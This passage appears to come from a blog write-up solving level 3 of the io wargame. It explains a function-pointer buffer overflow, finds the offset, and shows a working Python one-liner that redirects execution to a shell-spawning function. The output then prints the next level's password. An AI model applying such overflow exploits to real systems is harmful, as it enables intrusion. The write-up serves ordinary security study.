-</pre></td><td class='code'><pre><code class=''><span class='line'>This is exciting we're going to 0x80484a4
-</span><span class='line'>I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.</p>
-
-<p>I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x63413563 in ?? ()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So EIP points to some junk that I provided with the string. Let&rsquo;s check the offset:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>./pattern_offset.rb 0x63413563
-</span><span class='line'>[*] Exact match at offset 76</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
-</span><span class='line'>This is exciting we're going to 0x8048474
-</span><span class='line'>Win.
-</span><span class='line'>sh-4.2$ whoami
-</span><span class='line'>level4
-</span><span class='line'>sh-4.2$ cat /home/level4/.pass
-</span><span class='line'>9C4Jxjc3O3IjB7nXej</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We hijacked the execution flow and made EIP point to the address of the function we needed.</p>
-
-<blockquote><p>The surest protection against temptation is cowardice.</p>
 
 <p>&mdash; Mark Twain</p></blockquote>
 ]]></content>
